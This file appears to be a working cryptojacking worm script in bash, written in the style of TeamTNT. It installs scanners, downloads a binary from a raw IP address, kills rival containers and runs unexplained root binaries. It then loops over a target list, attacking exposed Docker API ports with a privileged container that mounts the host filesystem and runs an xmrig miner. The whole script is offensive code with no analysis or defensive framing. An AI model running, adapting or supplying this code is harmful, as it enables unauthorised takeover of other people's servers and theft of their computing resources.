#!/bin/bash
RATE_TO_SCAN=500000

log_message() {
    logger -t my-scanner "$1"
}

log_message "Starting script"

if type apt-get 2>/dev/null 1>/dev/null; then 
    apt-get update --fix-missing 2>/dev/null 1>/dev/null; 
    apt-get install -y wget curl jq bash masscan libpcap-dev 
    log_message "Installed dependencies with apt-get"
fi

if type yum 2>/dev/null 1>/dev/null; then 
    yum clean all 2>/dev/null 1>/dev/null; 
    yum install -y wget curl jq bash masscan libpcap-devel 
    log_message "Installed dependencies with yum"
fi

if ! type zgrab 2>/dev/null 1>/dev/null; then 
    wget http://45.9.148.85/bin/zgrab -O /usr/bin/zgrab && chmod +x /usr/bin/zgrab 
    log_message "Downloaded and installed zgrab"
fi

if ! type docker 2>/dev/null; then 
    curl -sLk https://get.docker.com | bash 
    log_message "Installed Docker"
fi

docker stop $(docker ps | grep -v 'CONTAINER' | grep -v 'tntpwner2\|b0rgdrone24\|dockgeddon' | awk '{print $1}')
log_message "Stopped unnecessary Docker containers"

chmod +x /usr/bin/zgrab
chmod +x /root/dockerd
chmod +x /root/TNTfeatB0RG
log_message "Set executable permissions for necessary files"

/root/TNTfeatB0RG
nice -n -20 /root/dockerd || /root/dockerd
log_message "Started dockerd"

/root/TNTfeatB0RG

dAPIpwn(){
    ip_list_file=$1
    port=$2
    while read -r ipaddy
    do
        TARGET=$ipaddy:$port
        log_message "Pwn attempt on $TARGET"
        echo '##################################################'
        echo $TARGET
        timeout -s SIGKILL 240 docker -H $TARGET run -d --net host --privileged --name dockgeddon -v /:/host xululol/xmrig
        log_message "Executed Docker command on $TARGET"
    done < "$ip_list_file"
}

while true 
do
    dAPIpwn ip_list.txt 2375
    dAPIpwn ip_list.txt 2376
    dAPIpwn ip_list.txt 2377
    dAPIpwn ip_list.txt 4244
    dAPIpwn ip_list.txt 4243
done
